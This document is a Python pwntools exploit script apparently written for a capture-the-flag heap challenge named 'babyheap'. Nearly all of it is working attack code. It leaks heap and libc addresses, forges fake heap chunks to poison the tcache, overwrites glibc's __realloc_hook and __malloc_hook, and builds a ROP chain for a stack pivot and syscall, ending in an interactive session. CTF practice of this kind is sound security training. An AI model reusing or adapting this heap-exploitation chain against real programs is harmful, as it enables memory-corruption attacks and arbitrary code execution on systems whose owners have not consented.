#!/usr/bin/python3

from pwn import *
import sys

#HOST = 'eofqual.zoolab.org'
HOST = 'localhost'
PORT = 10101
BIN = './babyheap'
LIBC = './libc.so.6'

context.arch = 'amd64'

e = ELF(BIN)
l = ELF(LIBC)

if len(sys.argv) > 1:
    r = remote(HOST, PORT)
else:
    r = process(BIN)

def ch(i):
    r.sendafter('choice : ', str(i))

def add(size, data):
    ch('C')
    r.sendlineafter("Size : ", str(size))
    r.sendlineafter("Data : ", data)
 
def edit(data):
    ch('E')
    r.sendlineafter("Data : ", data)
 
def delete():
    ch('D')
 
def show():
    ch('S')

def ultra(data):
    ch('U')
    r.sendlineafter("Data : ", data)

for _ in range(7):
    add(0x408, 'Q') # 1~7
    delete() # 1~7
"""
create 10
show 2
edit 1
delete 8
"""
show() # 1
heap = u64(r.recv(6) + b'\x00'*2) - 0x2b10
log.info(f'heap: {hex(heap)}')
add(0x408, 'Q') # 8

for i in range(2): # 2 fake 0x410 chunk prevsize
    ultra(p64(0x410) + p64(0x20))
for i in range(10):
    ultra(p64(0) + p64(0x21))

delete()# 8
show() # 2
libc = u64(r.recv(6) + b'\x00'*2) - 0x1ebbe0
main_arena = 0x1ebbe0 + libc
l.address = libc
log.info(f'libc: {hex(libc)}')
chk_base = heap + 0x3320
log.info(f'chk_base: {hex(chk_base)}')

payload = flat(
    main_arena, chk_base + 0x50,
    0, 0, # fd_nextsize, bk_nextsize

    0, 0x411, # second 0x410 chunk
    chk_base + 0x210, chk_base + 0x250,
    
    0, 0x21, # 1
    chk_base, chk_base + 0x90,

    0x20, 0x20,
    0, 0,

    0, 0x21, # 2
    chk_base + 0x50, chk_base + 0xd0,

    0x20, 0x20,
    0, 0,

    0, 0x21, # 3
    chk_base + 0x90, chk_base + 0x110,
 
    0x20, 0x20,
    0, 0,

    0, 0x21, # 4
    chk_base + 0xd0, chk_base + 0x150,

    0x20, 0x20,
    0, 0,

    0, 0x21, # 5
    chk_base + 0x110, chk_base + 0x190,

    0x20, 0x20,
    0, 0,

    0, 0x21, # 6
    chk_base + 0x150, chk_base + 0x1d0,

    0x20, 0x20,
    0, 0,

    0, 0x21, # 7
    chk_base + 0x190, chk_base + 0x210,

    0x20, 0x20,
    0, 0,

    0, 0x21, # 8 (return to user)
    chk_base + 0x1d0, chk_base + 0x30,

    0x20, 0x20,
    0, 0,

    0, 0x21, # 9
    chk_base + 0x30, chk_base + 0x290,

    0x20, 0x20,
    0, 0,
)

edit(payload)
ultra(b'\xff'*8)

# tcache 7 chunk = chk_size + 0x1d0

add(0x408, p64(0)*(0x190 // 8) + p64(0) + p64(0x21) + p64(l.sym['__realloc_hook']) + p64(heap + 0x10)) # 9

ultra('Q')

##### start stack pivoting #####
pop_rdi_ret = 0x26b72 + libc
pop_rsi_ret = 0x27529 + libc
pop_rax_rdx_rbx_ret = 0x162865 + libc
leave_ret = 0x5aa48 + libc
syscall_ret = 0x66229 + libc
add_al_0x11_ret = 0x1263fa + libc

ROP = flat(
    pop_rdi_ret,
    heap,
    pop_rsi_ret,
    0x21000,
    pop_rax_rdx_rbx_ret,
    0xff,
    0x7,
    0,
    add_al_0x11_ret,
    syscall_ret,
)

ultra(p64(leave_ret) + p64(l.sym['realloc'])) # write into realloc_hook + malloc_hook
r.interactive()
